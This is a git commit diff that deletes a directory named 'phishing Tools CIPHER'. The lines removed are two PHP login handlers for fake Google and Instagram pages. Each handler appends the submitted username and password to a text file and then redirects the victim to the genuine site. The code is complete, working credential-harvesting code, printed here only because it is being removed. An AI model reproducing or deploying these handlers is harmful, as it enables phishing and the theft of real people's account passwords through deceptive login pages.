a04b5f058944594d715d9d37b9334c1c545b4639
CipherX <102590998+CipherX-MAN@users.noreply.github.com>
2022-05-04 11:25:17 -0700

    Delete phishing Tools CIPHER directory

--- phishing Tools CIPHER/site/google/login.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-file_put_contents("google.txt", "GMAIL : " . $_POST['username'] . "\nPASSWORD : " . $_POST['password'] . "\n<==========>\n", FILE_APPEND);
-sleep(2);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-exit();
-                             
--- phishing Tools CIPHER/site/instagram/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("instagram.txt", "user : " . $_POST['username'] . "\npassword : " . $_POST['password'] . "\n<========>\n", FILE_APPEND);
-sleep(2);
-header('Location: https://instagram.com');
-exit();
